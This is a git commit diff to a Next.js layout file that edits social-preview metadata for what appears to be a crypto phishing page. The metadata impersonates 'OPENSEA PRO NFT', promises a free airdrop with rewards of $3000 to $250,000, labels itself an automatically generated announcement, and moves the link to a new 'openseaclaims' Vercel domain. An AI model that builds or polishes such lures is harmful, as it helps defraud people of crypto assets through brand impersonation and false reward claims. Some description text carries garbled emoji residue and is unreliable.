c14775d98501343cc7397e1f457260fb538c23de
Techie_Steve <tuwa.1simon@gmail.com>
2025-12-26 16:17:03 +0100

    Update layout.tsx

--- app/layout.tsx
+++ app/layout.tsx
@@ -4,12 +4,12 @@ import type { ReactNode } from "react";
 export const metadata: Metadata = {
   title: "CLICK HERE - OPENSEA PRO NFT",
   description:
-    "7e2 AIRDROP IS LIVE NOW 7e2 Price: FREE 389 Supply: 150 Mystery Box 389 Reward: between $3000 and $250,000",
+    "AIRDROP IS LIVE NOW Price: FREE 389 Supply: 150 Mystery Box 389 Reward: between $3000 and $250,000",
   openGraph: {
     title: "CLICK HERE - OPENSEA PRO NFT",
     description:
-      "7e2 AIRDROP IS LIVE NOW 7e2 Price: FREE 389 Supply: 150 Mystery Box 389 Reward: between $3000 and $250,000",
-    url: "https://tokens-giveaway25ksk.vercel.app/",
+      "AIRDROP IS LIVE NOW  Price: FREE 389 Supply: 150 Mystery Box 389 Reward: between $3000 and $250,000",
+    url: "https://openseaclaims-chi.vercel.app/",
     siteName: "This is an automatically generated announcement message",
     images: [
       {
@@ -25,7 +25,7 @@ export const metadata: Metadata = {
     card: "summary_large_image",
     title: "CLICK HERE - OPENSEA PRO NFT",
     description:
-      "7e2 AIRDROP IS LIVE NOW 7e2 Price: FREE 389 Supply: 150 Mystery Box 389 Reward: between $3000 and $250,000",
+      "AIRDROP IS LIVE NOW Price: FREE 389 Supply: 150 Mystery Box 389 Reward: between $3000 and $250,000",
     images: ["https://tokens-giveaway25ksk.vercel.app/389-9bec97c22fa2e411.gif"],
   },
 };
